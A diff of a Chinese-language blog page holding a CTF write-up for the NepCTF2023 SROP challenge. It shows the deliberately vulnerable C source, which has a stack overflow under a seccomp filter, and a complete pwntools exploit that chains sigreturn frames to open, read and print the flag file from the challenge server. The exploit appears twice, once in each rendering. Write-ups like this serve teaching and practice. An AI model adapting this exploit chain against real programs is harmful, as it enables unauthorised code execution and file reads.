@@ -59,8 +59,6 @@
     <div class="date">2023 August 12th</div>
     <div class="tags">
       
-      <div class="tag-item">CTF</div>
-      
       <div class="tag-item">PWN</div>
       
     </div>
@@ -81,8 +79,38 @@
 </blockquote>
 <p>另外，pwntools中的<code>SigreturnFrame()</code>可以方便完成寄存器的布置</p>
 <h1 id="Nepctf2023-SROP"><a href="#Nepctf2023-SROP" class="headerlink" title="Nepctf2023-SROP"></a>Nepctf2023-SROP</h1><p>源码都喂我嘴里了</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x30</span>]=<span class="string">&quot;welcome to NepCTF2023!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seccomp</span><span class="params">()</span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="type">char</span> bd[<span class="number">0x30</span>];</span><br><span class="line">     seccomp();</span><br><span class="line">     syscall(<span class="number">1</span>,<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br><span class="line">     <span class="keyword">return</span> syscall(<span class="number">0</span>,<span class="number">0</span>,bd,<span class="number">0x300</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">//gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;syscall.h&gt;
+#include &lt;seccomp.h&gt;
+#include &lt;linux/seccomp.h&gt;
 
+char buf[0x30]=&quot;welcome to NepCTF2023!\n&quot;;
+
+int seccomp()&#123;
+    scmp_filter_ctx ctx;
+    ctx = seccomp_init(SCMP_ACT_KILL);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0);
+    seccomp_load(ctx);
+    return 0;
+&#125;
+
+int sys()&#123;
+    return 15;
+&#125;
+
+int main()&#123;
+     char bd[0x30];
+     seccomp();
+     syscall(1,1,buf,0x30);
+     return syscall(0,0,bd,0x300);
+&#125;
+</code></pre>
 <p>显然需要打一个orw</p>
 <p>注意这里有一个坑，众所周知，<code>syscall</code>的系统调用号是通过<code>rax</code>传递，然而我们反汇编之后</p>
 <p><img src="/../img/SROP.assets/image-20230812211245122.png" alt="image-20230812211245122"></p>
@@ -96,8 +124,96 @@
 <p><code>sig.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)</code></p>
 <p>从左往右依次为<code>cs</code> <code>gs</code> <code>fs</code> <code>ss</code></p>
 <p>exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	cmd += <span class="string">&quot;b *0x0000000004007AE\n&quot;</span></span><br><span class="line">	gdb.attach(p, cmd)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;nepctf.1cepeak.cn&quot;</span></span><br><span class="line">port = <span class="number">30551</span></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line">sig = <span class="number">0x0000000000400750</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">syscall = <span class="number">0x00000000004007A8</span></span><br><span class="line">buf = <span class="number">0x0000000000601020</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0x38</span> +p64(pop_rdi)+p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span class="number">0</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x1000</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x10</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">2</span></span><br><span class="line">sig.rsi = buf</span><br><span class="line">sig.rdx = <span class="number">0</span></span><br><span class="line">sig.rcx = <span class="number">0</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x120</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x120</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x120</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x120</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span class="number">3</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x240</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x240</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">1</span></span><br><span class="line">sig.rsi = <span class="number">1</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+from pwn import*
 
+context(os = &#39;linux&#39;, arch = &#39;amd64&#39;, log_level = &#39;debug&#39;, terminal = [&#39;tmux&#39;, &#39;new-window&#39;])
+def debug(cmd=&#39;&#39;):
+    cmd += &quot;b *0x0000000004007AE\n&quot;
+    gdb.attach(p, cmd)
+    pause()
+
+host = &quot;nepctf.1cepeak.cn&quot;
+port = 30551
+#p = process(&quot;./pwn&quot;)
+p = remote(host, port)
+
+sig = 0x0000000000400750
+pop_rdi = 0x0000000000400813
+syscall = 0x00000000004007A8
+buf = 0x0000000000601020
+
+p.recv()
+payload = &quot;\x00&quot;*0x38 +p64(pop_rdi)+p64(0xf)
+sig = SigreturnFrame()
+sig.uc_flags = syscall
+sig.rax = 0
+sig.rdi = 0
+sig.rsi = 0
+sig.rdx = buf
+sig.rcx = 0x1000
+sig.rip = syscall
+sig.rsp = buf+0x10
+sig.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)
+payload += str(sig)
+
+p.send(payload)
+
+# debug()
+
+payload = &quot;flag\x00\x00\x00\x00&quot;
+payload += p64(pop_rdi) + p64(0xf)
+sig = SigreturnFrame()
+sig.uc_flags = syscall
+sig.rax = 0
+sig.rdi = 2
+sig.rsi = buf
+sig.rdx = 0
+sig.rcx = 0
+sig.rip = syscall
+sig.rsp = buf+0x120
+sig.rbp = buf+0x120
+sig.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)
+payload += str(sig)
+
+payload = payload.ljust(0x120,&quot;\x00&quot;)
+payload += p64(buf+0x120)#rbp
+payload += p64(pop_rdi) + p64(0xf)
+sig = SigreturnFrame()
+sig.uc_flags = syscall
+sig.rax = 0
+sig.rdi = 0
+sig.rsi = 3
+sig.rdx = buf
+sig.rcx = 0x100
+sig.rip = syscall
+sig.rsp = buf+0x240
+sig.rbp = buf+0x240
+sig.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)
+payload += str(sig)
+
+payload = payload.ljust(0x240,&quot;\x00&quot;)
+payload += p64(buf+0x240)#rbp
+payload += p64(pop_rdi) + p64(0xf)
+sig = SigreturnFrame()
+sig.uc_flags = syscall
+sig.rax = 0
+sig.rdi = 1
+sig.rsi = 1
+sig.rdx = buf
+sig.rcx = 0x100
+sig.rip = syscall
+sig.rsp = buf+0x240
+sig.rbp = buf+0x240
+sig.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)
+payload += str(sig)
+
+
+p.send(payload)
+
+p.interactive()
+</code></pre>
 </main>
 
 </article>
